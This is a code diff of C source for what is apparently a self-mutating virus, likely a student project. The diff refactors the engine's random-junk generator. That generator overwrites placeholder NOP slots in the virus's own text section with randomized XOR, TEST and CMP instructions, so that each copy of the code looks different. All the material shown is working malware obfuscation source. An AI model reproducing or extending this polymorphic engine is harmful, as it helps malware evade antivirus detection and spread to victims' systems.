@@ -15,7 +15,8 @@ extern void end(void);
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
 int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
-uint8_t __attribute__((section(".text#"))) g_rand_junk[RAND_SIZE] = {0};
+uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
+uint16_t __attribute__((section(".text#"))) g_ri = 0;
 
 
 /*
@@ -79,7 +80,6 @@ enum e_opcode {
 	OPCODE_XOR  = 0x31,
 	OPCODE_TEST = 0x85,
 	OPCODE_CMP  = 0x39,
-
 };
 
 static uint8_t get_random_opcode(uint8_t rand) {
@@ -104,21 +104,19 @@ static uint8_t get_random_opcode(uint8_t rand) {
 
 }
 
-static void gen_junk(uint8_t *rdm_junk, uint16_t *r_i) {
+static void gen_junk(uint8_t *rdm_junk) {
 
 	uint8_t reg_1 = 4;
 	uint8_t reg_2 = 4;
 
-	uint8_t *rand = g_rand_junk;
 
 	/* check is rsp */
-
-	for (; *r_i < RAND_SIZE && reg_1 == 4; r_i++) {
-		reg_1 = rand[*r_i % RAND_SIZE] % 8;
+	for (; g_ri < RAND_SIZE && reg_1 == 4; g_ri++) {
+		reg_1 = g_rand[g_ri % RAND_SIZE] % 8;
 	}
 
-	for (; *r_i < RAND_SIZE && (reg_2 == 4 || reg_2 == reg_1); r_i++) {
-		reg_2 = rand[(*r_i + 1) % RAND_SIZE] % 8;
+	for (; g_ri < RAND_SIZE && (reg_2 == 4 || reg_2 == reg_1); g_ri++) {
+		reg_2 = g_rand[(g_ri + 1) % RAND_SIZE] % 8;
 	}
 
 	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
@@ -137,8 +135,8 @@ static void gen_junk(uint8_t *rdm_junk, uint16_t *r_i) {
 	uint8_t nop_1[3] = {OP_64, XCHG, RAX_RAX};
 	uint8_t nop_2[3] = {OP_64, XCHG, RAX_RAX};
 
-	uint8_t opcode_1 = get_random_opcode(rand[*r_i % RAND_SIZE]);
-	uint8_t opcode_2 = get_random_opcode(rand[(*r_i + 1) % RAND_SIZE]);
+	uint8_t opcode_1 = get_random_opcode(g_rand[g_ri % RAND_SIZE]);
+	uint8_t opcode_2 = get_random_opcode(g_rand[(g_ri + 1) % RAND_SIZE]);
 
 	nop_1[1] = opcode_1;
 	nop_1[2] += reg_1;
@@ -164,14 +162,13 @@ static void gen_junk(uint8_t *rdm_junk, uint16_t *r_i) {
 
 static void replace_nop(uint8_t *self, int *junk_offsets) {
 
-	uint16_t r_i = 0;
 	for (size_t i = 0; i < NB_JUNK_MAX ; i++) {
 		/* at this point junk_offsets is filled */
 		if (junk_offsets[i] == 0) {
 			break;
 		}
 		uint8_t rdm_junk[10];
-		gen_junk(rdm_junk, &r_i);
+		gen_junk(rdm_junk);
 		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);
 
 	}
@@ -198,7 +195,7 @@ void prepare_mutate(void) {
 
 	make_writeable((uint8_t *)start, VIRUS_SIZE);
 
-	getrandom(g_rand_junk, RAND_SIZE, 0);
+	getrandom(g_rand, RAND_SIZE, 0);
 
 	JUNK;
 
